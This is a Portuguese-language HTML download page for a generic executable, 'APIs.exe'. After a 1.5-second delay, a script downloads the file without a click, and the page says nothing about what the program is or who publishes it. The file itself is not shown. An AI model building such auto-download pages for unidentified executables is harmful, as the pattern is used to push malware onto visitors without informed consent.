<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0f0f0f;
            font-family: 'Segoe UI', sans-serif;
            color: #fff;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 24px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: #888;
            margin-bottom: 24px;
        }

        a {
            display: inline-block;
            padding: 10px 28px;
            background: #3b82f6;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-size: 14px;
            transition: background 0.2s;
        }

        a:hover {
            background: #2563eb;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Seu download vai começar em instantes...</h1>
        <p>Se não iniciar automaticamente, clique no botão abaixo.</p>
        <a href="APIs.exe" download>Baixar manualmente</a>
    </div>
    <script>
        window.onload = function () {
            setTimeout(function () {
                var a = document.createElement('a');
                a.href = 'APIs.exe';
                a.download = 'APIs.exe';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            }, 1500);
        };
    </script>
</body>

</html>
